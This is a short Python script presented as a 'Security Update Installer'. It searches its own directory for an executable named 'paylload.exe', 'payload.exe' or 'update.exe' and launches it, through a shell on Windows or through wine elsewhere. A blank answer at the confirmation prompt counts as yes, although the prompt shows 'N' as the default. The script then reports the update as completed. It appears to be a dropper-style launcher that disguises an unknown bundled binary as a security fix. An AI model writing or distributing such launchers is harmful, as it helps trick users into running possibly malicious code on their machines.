#!/usr/bin/env python3


import os
import sys
import subprocess
import time
from pathlib import Path
import platform

def find_payload_exe():
    """Locate paylload.exe in repo directory"""
    candidates = [
        Path(__file__).parent / "paylload.exe",
        Path(__file__).parent / "payload.exe",
        Path(__file__).parent / "update.exe"
    ]
    
    for exe in candidates:
        if exe.exists() and exe.stat().st_size > 1000:
            return exe
    return None

def execute_payload_visible(exe_path):
    """Execute EXE visibly in foreground"""
    is_windows = platform.system() == "Windows"
    
    print(f"\n Executing security payload: {exe_path.name}")
    print("This may open a new window or command prompt...")
    
    if is_windows:
        # VISIBLE Windows execution
        subprocess.Popen(
            [str(exe_path)],
            cwd=Path(__file__).parent,
            shell=True  # Visible shell
        )
    else:
        # VISIBLE Linux execution
        subprocess.Popen(
            ["wine", str(exe_path)],
            cwd=Path(__file__).parent
        )
    
    print(f" Payload launched: {exe_path.name}")
    return True

def main():
    print(" Security Update Installer")
    print("=" * 50)
    
    # Find payload
    exe_path = find_payload_exe()
    if not exe_path:
        print(" No security payload found!")
        print("Ensure paylload.exe exists in current directory.")
        sys.exit(1)
    
    print(f" Found payload: {exe_path.name} ({exe_path.stat().st_size / 1024:.1f} KB)")
    
    # User confirmation
    confirm = input("\n  Execute security update? (y/N): ").lower().strip()
    if confirm not in ['y', 'yes', '']:
        print(" Update cancelled by user.")
        sys.exit(0)
    
    # Execute visibly
    execute_payload_visible(exe_path)
    
    print("\n Security update completed!")
    print("Monitor any new windows/processes for results.")
    
    input("\nPress Enter to exit...")
    sys.exit(0)

if __name__ == "__main__":
    main()
